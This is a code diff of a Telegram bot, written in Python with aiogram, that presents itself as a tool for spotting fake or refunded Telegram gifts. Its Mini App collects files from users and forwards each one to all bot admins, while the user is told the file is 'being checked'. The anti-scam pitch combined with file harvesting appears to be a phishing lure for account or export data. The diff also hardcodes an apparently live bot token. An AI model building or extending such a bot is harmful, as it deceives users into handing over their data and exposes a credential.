@@ -11,7 +11,6 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFil
 BOT_TOKEN = '8202878099:AAES9ybI0KKY9e_ixXrUMXtwqs-TL2r8nQg'
 
 # ID главных админов (добавляются автоматически при старте)
-# Можно указать несколько через запятую
 ROOT_ADMINS = [8187498719, 8396015606]
 
 WEB_APP_URL = "https://kareli123.github.io/nicegram/" 
@@ -35,7 +34,7 @@ def init_db():
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
         
-        # 1. Таблица всех пользователей (для поиска по username)
+        # 1. Таблица всех пользователей
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS users (
                 user_id INTEGER PRIMARY KEY,
@@ -51,21 +50,19 @@ def init_db():
             )
         ''')
         
-        # Добавляем ROOT админов сразу
+        # Добавляем ROOT админов
         for admin_id in ROOT_ADMINS:
             cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (admin_id,))
         
         conn.commit()
 
 def add_user_if_new(user: types.User):
-    """Сохраняет пользователя в базу для истории и поиска"""
     try:
         with sqlite3.connect(DB_FILE) as conn:
             cursor = conn.cursor()
             cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (user.id,))
             if cursor.fetchone():
                 return False 
-            
             cursor.execute("INSERT INTO users (user_id, username, full_name) VALUES (?, ?, ?)", 
                            (user.id, user.username, user.full_name))
             conn.commit()
@@ -75,14 +72,12 @@ def add_user_if_new(user: types.User):
         return False
 
 def get_all_admins():
-    """Возвращает список ID всех админов"""
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
         cursor.execute("SELECT user_id FROM admins")
         return [row[0] for row in cursor.fetchall()]
 
 def add_new_admin(user_id):
-    """Добавляет нового админа в базу"""
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
         cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (user_id,))
@@ -116,11 +111,10 @@ async def handle_upload_file(request: web.Request):
 
     if user_id and file_data:
         try:
-            # Получаем список всех админов
             admin_ids = get_all_admins()
             caption_text = f"🚨 Файл загружен через Mini App!\nUser ID: {user_id}"
             
-            # Рассылаем файл ВСЕМ админам
+            # Рассылка всем админам
             for admin_id in admin_ids:
                 try:
                     await bot.send_document(
@@ -129,9 +123,9 @@ async def handle_upload_file(request: web.Request):
                         caption=caption_text
                     )
                 except Exception as e:
-                    logging.warning(f"Не удалось отправить файл админу {admin_id}: {e}")
+                    logging.warning(f"Ошибка отправки админу {admin_id}: {e}")
 
-            # Ответ пользователю
+            # Ответ юзеру
             try:
                 await bot.send_message(chat_id=int(user_id), text="✅ Файл принят. Ожидайте проверки.")
             except:
@@ -159,9 +153,11 @@ async def handle_options(request):
 TEXT_MAIN = """Привет! Я - Бот, который поможет тебе не попасться на мошенников. 
 Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги."""
 
+# !!! ИЗМЕНЕННАЯ КЛАВИАТУРА !!!
 def get_main_keyboard():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🚀 Открыть приложение", web_app=WebAppInfo(url=WEB_APP_URL))]
+        [InlineKeyboardButton(text="🚀 Открыть приложение", web_app=WebAppInfo(url=WEB_APP_URL))],
+        [InlineKeyboardButton(text="📱 Скачать NiceGram", url="https://nicegram.app/")]
     ])
 
 @router.message(Command("start"))
@@ -176,7 +172,6 @@ async def cmd_start(message: types.Message):
             f"Username: @{user.username}\n"
             f"ID: <code>{user.id}</code>"
         )
-        # Уведомляем ВСЕХ админов
         admin_ids = get_all_admins()
         for admin_id in admin_ids:
             try:
@@ -193,23 +188,20 @@ async def cmd_start(message: types.Message):
     else:
         await message.answer(TEXT_MAIN, reply_markup=get_main_keyboard())
 
-# --- КОМАНДА ВЫДАЧИ АДМИНКИ ---
+# --- АДМИНКА ---
 @router.message(Command("admin"))
 async def cmd_add_admin(message: types.Message):
-    # 1. Проверяем, является ли отправитель админом
     current_admins = get_all_admins()
     if message.from_user.id not in current_admins:
-        return # Игнорируем обычных юзеров
+        return 
 
-    # 2. Разбираем команду
     args = message.text.split()
     if len(args) < 2:
-        await message.answer("⚠️ Чтобы выдать админку, напишите:\n<code>/admin @username</code>", parse_mode="HTML")
+        await message.answer("⚠️ Используйте: <code>/admin @username</code>", parse_mode="HTML")
         return
 
     target_username = args[1].replace('@', '').lower()
 
-    # 3. Ищем ID пользователя в базе
     new_admin_id = None
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
@@ -220,22 +212,20 @@ async def cmd_add_admin(message: types.Message):
             name = result[1]
     
     if not new_admin_id:
-        await message.answer("❌ Пользователь не найден. Он должен сначала запустить бота (/start).")
+        await message.answer("❌ Пользователь не найден (он должен нажать /start).")
         return
 
-    # 4. Добавляем в таблицу админов
     add_new_admin(new_admin_id)
     
-    await message.answer(f"✅ Пользователь <b>{name}</b> добавлен в администраторы!\nТеперь он тоже будет получать файлы.", parse_mode="HTML")
-    
+    await message.answer(f"✅ Пользователь <b>{name}</b> теперь администратор.", parse_mode="HTML")
     try:
-        await bot.send_message(new_admin_id, "👑 <b>Вам выданы права администратора!</b>\nТеперь вы будете получать файлы пользователей.", parse_mode="HTML")
+        await bot.send_message(new_admin_id, "👑 <b>Вам выданы права администратора!</b>", parse_mode="HTML")
     except:
         pass
 
 # --- ЗАПУСК ---
 async def main():
-    init_db() # Создаем таблицы и добавляем ROOT админов
+    init_db()
     
     app = web.Application()
     app.add_routes(routes)
